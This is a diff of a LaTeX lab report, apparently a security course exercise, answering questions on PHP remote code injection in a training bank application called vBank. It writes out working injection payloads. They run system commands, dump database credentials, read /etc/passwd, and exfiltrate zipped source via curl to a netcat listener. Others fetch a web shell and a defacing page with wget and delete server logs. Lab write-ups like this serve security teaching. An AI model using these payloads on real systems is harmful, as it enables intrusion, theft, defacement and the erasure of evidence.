@@ -95,7 +95,109 @@
 		
 	\section*{Exercise 2: Remote code injection}
 	
+	At this point you are quite familiar with the user interface of your bank application.
 	
+	\paragraph*{1.}{\bf Find a section that allows you to inject and execute arbitrary code (PHP). Document your steps and explain why does it allow the execution?}\\
+	
+	The section that executes arbitrary PHP code is in the ''htbdetails'' details page of the vBank application. There in the search field we enter the string {\sf '.system("uptime\%3Bid").'}
+	
+	\begin{figure}[H]
+	\includegraphics[width=.75\textheight,height=0.4\textheight]{images/2_1.jpg}
+	\caption{vulnerable section}
+	\end{figure}
+	
+	\paragraph*{2.}{\bf Disclose the master password for the database your bank application has access to. Indicate username, password and DB name as well as the IP address of the machine this database is running on.}\\
+	
+	All the configuration information can be found using a simple global variable dump:
+	We use this as our query: '.var\_dump(get\_defined\_vars()).'
+	
+	\begin{figure}[H]
+		\includegraphics[width=.75\textheight]{images/2_2.jpg}
+		\caption{retrieving useful Database information }
+	\end{figure}
+	
+	In the output received we can find the relevant information highlighted. The server's IP address, database login ID and password are all found.
+	
+	\paragraph*{3.}{\bf Explain how you can display the php settings of your webserver! Which information is relevant for the attacker ?}\\
+	
+	In the query field we can use '.phpinfo(INFO\_GENERAL).' to get a section of the php settings relevant to us. We use the flag INFO\_GENERAL to narrow down on the information more useful to the attacker.
+	
+	\begin{figure}[H]
+		\includegraphics[width=.75\textheight]{images/2_3.jpg}
+		\caption{Displaying phpinfo}
+	\end{figure}
 
-
+	\paragraph*{4.}{\bf Assume you are running a server with virtual hosts. Can you disclose the password for another bank database	and can you access it? Explain. Which potential risk does this vulnerability imply for virtual hosts?}\\
+	
+	We first have to list all the virtual hosts configured on the server. With the command apache2ctl -S we can list them. So the query will be {\sf '.system(''apache2ctl -S'').'} 
+	
+	\begin{figure}[H]
+		\includegraphics[width=.75\textheight]{images/2_4.jpg}
+		\caption{exposing virtual hosts.}
+	\end{figure}
+	
+	Virtual hosts are maintained by the servers to host numerous websites. If the information of virtual host are exposed, then other sites are also in danger of exploiting.
+	
+	\paragraph*{5.}{\bf Display /etc/passwd of the web server, the bank application is running on. Try different methods to	achieve this goal. Explain why some methods cannot be successful.} \\
+	
+	With the command {\sf '.system("cat /etc/passwd").'} in the search field, the passwd file can be displayed. 
+	
+	\begin{figure}[H]
+		\includegraphics[width=.75\textheight]{images/2_5.jpg}
+		\caption{displaying /etc/passwd.}
+	\end{figure}
+	 
+	\paragraph*{6.}{\bf Show how to ''leak'' the complete source files of your web application. Briefly describe, how you accomplished this.}\\
+	 
+	\begin{itemize}
+	 	
+	 	\item[a] On the attacker's computer we use: {\sf nc -vlp 6666 > vbank.zip}
+	 	\item[b] query= {\sf '.system("zip -q -r /tmp/vbank.zip ../*; curl -F 'data=@/tmp/vbank.zip;' http://0.0.0.0:6666").'}
+	 	\item[c] The attacker receives the file.
+	 	
+	\end{itemize}
+	 
+	\begin{figure}[H]
+	 	\includegraphics[width=.75\textheight]{images/2_6.jpg}
+	 	\caption{leaked source files.}
+	\end{figure}
+	
+	\paragraph*{7.}{\bf Suppose you are an anonymous attacker:
+		\begin{itemize}
+			\item Upload a web shell on the victim server and show that you can take control of the server.
+			\item Deface the main bank page.
+			\item Clear possible traces that could lead to you.
+		\end{itemize} }
+	
+	To upload a shell,\\
+	
+	In attacker's machine: {\sf nc -v -n -l -p 1234}.
+	In victim's machine, we run this command using the search box: {\sf '.system("wget -N 0.0.0.0:5000/static/shell.php").'}\\
+	From the attacker's machine we are able to access the shell.
+	
+	\begin{figure}[H]
+		\includegraphics[width=.75\textheight]{images/2_7_1.jpg}
+		\caption{shell uploaded.}
+	\end{figure}
+	
+	To Deface the main page,\\
+	
+	In the attacker's end, there was a index.php file made in {\sf /var/www/html/static/} folder. Attacker will simply run 'wget' to download that file on victim's machine, which will replace victim's index.php.\\
+	Command to use in search field: {\sf '.system("wget -N 0.0.0.0:5000/static/index.php").'}
+	
+	\begin{figure}[H]
+		\includegraphics[width=.75\textheight]{images/2_7_2.jpg}
+		\caption{Webapp defaced.}
+	\end{figure}
+	
+	To clear possible traces,\\
+	
+	Traces can be generally found in log files. Attacker can remove those logs by including 'rm' commands. Also the 'index.php' and 'shell.php' could be deleted.\\
+	Command to delete files: \\
+	{\sf '.system("rm /var/log/apache2/*").'}\\
+	{\sf '.system("rm /var/log/syslog").'}\\
+	{\sf '.system("rm /var/log/user.log").'}\\
+	{\sf '.system("rm /var/www/html/shell.php").'}\\
+	{\sf '.system("rm /var/www/html/index.php").'}\\
 \end{document}
+
